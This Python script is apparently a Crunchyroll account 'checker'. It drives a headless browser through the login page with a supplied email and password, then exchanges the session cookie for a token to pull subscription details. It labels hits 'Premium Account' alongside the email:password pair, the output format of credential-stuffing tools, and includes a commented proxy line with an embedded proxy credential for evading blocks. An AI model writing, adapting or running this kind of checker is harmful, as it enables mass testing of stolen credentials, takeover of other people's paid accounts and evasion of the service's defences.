import asyncio
from playwright.async_api import async_playwright
import httpx
from datetime import datetime
import pytz

AUTH_HEADER = "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"

async def get_etp_rt_cookie(email, password, proxy=None):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(user_agent=USER_AGENT, proxy={
            "server": proxy
        } if proxy else None)
        page = await context.new_page()
        await page.goto("https://www.crunchyroll.com/login")
        await page.fill('input[name="loginForm_username"]', email)
        await page.fill('input[name="loginForm_password"]', password)
        await page.click('button[type="submit"]')
        await page.wait_for_timeout(7000)  # wait for login and possible redirects
        cookies = await context.cookies()
        await browser.close()
        for cookie in cookies:
            if cookie["name"] == "etp_rt":
                return cookie["value"]
        return None

async def get_subscriptions(etp_rt_cookie):
    async with httpx.AsyncClient() as client:
        # Step 1: Get access token using etp_rt cookie
        token_headers = {
            "Authorization": AUTH_HEADER,
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": USER_AGENT,
            "Origin": "https://www.crunchyroll.com",
            "Referer": "https://www.crunchyroll.com/"
        }
        token_data = {
            "grant_type": "etp_rt_cookie"
        }
        cookies = {"etp_rt": etp_rt_cookie}

        token_res = await client.post(
            "https://www.crunchyroll.com/auth/v1/token",
            data=token_data,
            headers=token_headers,
            cookies=cookies
        )
        if token_res.status_code != 200:
            return {"error": "Token error", "response": token_res.text}

        js = token_res.json()
        token = js.get("access_token")
        account_id = js.get("account_id")
        if not token or not account_id:
            return {"error": "Invalid token/account"}

        # Step 2: Get subscription info
        sub_headers = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/json",
            "User-Agent": USER_AGENT,
            "Referer": "https://www.crunchyroll.com/",
            "Origin": "https://www.crunchyroll.com"
        }
        sub_res = await client.get(
            f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions",
            headers=sub_headers
        )
        try:
            data = sub_res.json()
        except Exception:
            return {"error": "Response was not JSON"}
        return data

def format_summary(data, email, password):
    try:
        sub = data["subscriptions"][0]
        plan = sub.get("plan", {}).get("tier", {}).get("text", "N/A")
        renew_iso = sub.get("nextRenewalDate", "N/A")
        trial = sub.get("plan", {}).get("activeFreeTrial", False)
        country = sub.get("plan", {}).get("countryCode", "Unknown")

        if renew_iso and renew_iso != "N/A":
            renew_dt = datetime.strptime(renew_iso, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=pytz.UTC)
            formatted_renew = renew_dt.strftime("%d-%m-%Y")
            days_left = (renew_dt - datetime.now(pytz.UTC)).days
        else:
            formatted_renew = "N/A"
            days_left = "N/A"

        return (
            f"✅ Premium Account\n"
            f"Acc: {email}:{password}\n"
            f"Country: {country}\n"
            f"Plan: {plan}\n"
            f"Trial: {trial}\n"
            f"Renew: {formatted_renew}\n"
            f"Days Left: {days_left}"
        )
    except Exception as e:
        return f"⛔ Error formatting response: {str(e)}"

async def crunchyroll_checker(email, password, proxy=None):
    print(f"Checking: {email}:{password}")
    etp_rt = await get_etp_rt_cookie(email, password, proxy)
    if not etp_rt:
        return "❌ Failed to get etp_rt cookie. Login probably failed or Cloudflare triggered."
    data = await get_subscriptions(etp_rt)
    if "subscriptions" in data and isinstance(data["subscriptions"], list) and data["subscriptions"]:
        return format_summary(data, email, password)
    if "error" in data:
        return f"❌ {data['error']}"
    return str(data)

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Usage: python3 thisfile.py EMAIL PASSWORD")
        exit(1)
    email = sys.argv[1]
    password = sys.argv[2]
    # Optional: Use your proxy (format: "ip:port:user:pass")
    # proxy = "http://PP_1D1E5YMPFG-country-IN:5vl30ay0@evo-pro.porterproxies.com:61236"
    proxy = None  # or set to your proxy
    result = asyncio.run(crunchyroll_checker(email, password, proxy))
    print(result)
    
